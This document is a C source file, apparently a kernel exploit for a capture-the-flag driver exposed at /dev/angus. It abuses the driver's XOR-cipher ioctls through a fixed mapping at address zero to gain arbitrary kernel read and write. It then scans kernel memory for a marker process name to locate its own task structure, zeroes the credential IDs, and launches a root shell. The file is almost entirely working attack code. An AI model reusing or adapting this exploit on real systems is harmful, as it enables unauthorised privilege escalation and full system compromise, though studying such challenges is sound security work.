#define _GNU_SOURCE

#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <stdint.h>
#include <inttypes.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/prctl.h>

typedef uint64_t u64;

#define info(fmt, ...) fprintf(stderr, "[+] " fmt "\n", ##__VA_ARGS__)
#define IS_PRINTABLE(c) ((c) > 31 && (c) < 127)

void hexdump(const void *buffer, size_t size) {
    const unsigned char *data = buffer;

    for (size_t i = 0; i < size; i++) {
        printf("%02x ", data[i]);
        if ((i % 16) == 15 || i == size - 1) {
            printf(" |");
            for (size_t j = i - (i % 16); j <= i; j++)
                putchar(IS_PRINTABLE(data[j]) ? data[j] : '.');
            puts("|");
        }
    }
}

void dump(const void *buffer, size_t count) {
    const u64 *data = buffer;

    for (size_t i = 0; i < count; i++)
        printf("[%zu] 0x%016" PRIx64 "\n", i, data[i]);
}

void fatal(const char *message) {
    perror(message);
    exit(EXIT_FAILURE);
}

#define CMD_INIT    0x13370001
#define CMD_SETKEY  0x13370002
#define CMD_SETDATA 0x13370003
#define CMD_GETDATA 0x13370004
#define CMD_ENCRYPT 0x13370005
#define CMD_DECRYPT 0x13370006

typedef struct {
  char *ptr;
  size_t len;
} request_t;

typedef struct {
  char *key;
  char *data;
  size_t keylen;
  size_t datalen;
} XorCipher;

void set_proc_name(const char *name) {
    int ret = prctl(PR_SET_NAME, name, 0, 0, 0);
    if (ret) fatal("prctl");
}

XorCipher *ctx = NULL;
int fd;

int arr(char *dst, char *src, size_t len) {
    ctx->data = src;
    ctx->datalen = len;
    
    request_t req = {0};
    req.ptr = dst;
    req.len = len;
    int rc = ioctl(fd, CMD_GETDATA, &req);
    // if (rc < 0) fatal("ioctl CMD_GETDATA");
    return rc;
}

void arw(char *dst, char *src, size_t len) {
    char *t = malloc(0x1000);
    arr(t, dst, len);
    
    for (size_t i = 0; i < len; ++i)
        t[i] ^= src[i];

    ctx->key = t;
    ctx->keylen = len;
    ctx->data = dst;
    ctx->datalen = len;

    request_t req = {0};
    int rc = ioctl(fd, CMD_ENCRYPT, &req);
    if (rc < 0) fatal("ioctl arw");
}

int main(void) {
    info("start exp");
    int rc;
    
    fd = open("/dev/angus", O_RDWR);
    if (fd < 0) fatal("open dev");

    ctx = mmap((void*)0,
                0x1000,
                PROT_READ | PROT_WRITE | PROT_EXEC,
                MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED | MAP_POPULATE,
                -1,
                0);

    set_proc_name("pisellon");    
    
    u64 sz = 0x1000000;
    char found = 0;
    char *buf = calloc(1, sz);
    if (!buf) perror("calloc");

    info("scanning memory");

    u64 addr = 0xffff800000000000;
    for (addr = 0xffff800000000000; addr <= 0xfffff00000000000; addr += sz) {
        rc = arr(buf, (char*)addr, sz);    
        if (rc != 0) continue;
                
        char *comm = memmem(buf, sz, "pisellon", 8);
        if (comm) {
            u64 off = (u64)comm - (u64)buf;
            addr += off;
            info("found comm '%s' at addr: 0x%lx", comm, addr);
            found = 1;
            break;
        }        
    }

    if (!found) {
        info("task not found");
        return 1;
    }

    void *task = (void*)(addr - 0x5c0);
    info("task at: 0x%lx", (u64)task);

    arr(buf, task, 0x1000);

    u64 cred_addr = ((u64*)buf)[182];
    info("cred: 0x%lx", cred_addr);

    char *cred = (char*)cred_addr;
    for (size_t i = 1; i <= 8; ++i)
        arw(cred+(4*i), "\x00\x00\x00\x00", 4);
    
    system("/bin/sh");
    
    info("end exp");
    return 0;
}
